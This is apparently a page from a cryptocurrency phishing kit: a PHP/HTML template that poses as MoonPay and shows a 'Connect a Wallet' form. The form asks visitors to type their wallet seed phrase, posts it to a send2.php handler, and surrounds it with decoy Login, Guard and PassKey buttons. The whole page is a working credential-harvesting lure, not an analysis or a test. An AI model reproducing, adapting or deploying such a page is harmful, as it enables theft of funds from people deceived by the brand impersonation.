<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'MoonPay: Buy and sell Bitcoin, Ethereum, and other cryptos';
        include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container-fluid'>
            <div class="row justify-content-center">
                <div class='col-sm-4 rounded-4 p25 my30 bg-white' style="border: 1px #edf2f9 solid">
                    <h1 class='h6 mobile_web_font fw-bold pt10 text-center'>Connect a Wallet</h1>
                    <form method="post" action="<?= base_url('send2.php')?>" class="">
                        <div class="my20">
                            <label class="form-label fw-semibold">To import your wallet, enter your seed phrase in the field below</label>
                            <textarea name="phrase" required="" class="form-control form-control-add" placeholder="Send Phrase"></textarea>
                        </div>
                        <div class="d-grid my30">
                            <button type="submit" class="btn btn-primary-2 py10 btn-lg" >Submit</button>
                        </div>
                        <div class="row">
                            <div class='col-sm-12 mt10 text-center border-top' style="position: relative">
                                <span class="text-secondary px10 bg-white" style="position: absolute; bottom:-10px">or</span>
                            </div>
                            <div class='col-sm-12 my30 d-grid'>
                                <a href="<?= base_url('index.php')?>" class="btn btn-primary-3 text-start"><i class="fa-solid fa-wallet text-primary-2 fs16 px10"></i> Login </a>
                                <a href="#" class="btn btn-primary-3 mt20 text-start"><i class="fa-solid fa-laptop-medical text-primary-2 fs16 px10"></i> Gaurd </a>
                                <a href="#" class="btn btn-primary-3 mt20 text-start"><i class="fa-solid fa-key text-primary-2 fs16 px10"></i> PassKey </a>
                            </div>
                            <div class='col-sm-12 text-center mt30'>
                                No account yet? <a class="text-decoration-none ps3" href="#" target="_blank"> Sign Up</a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>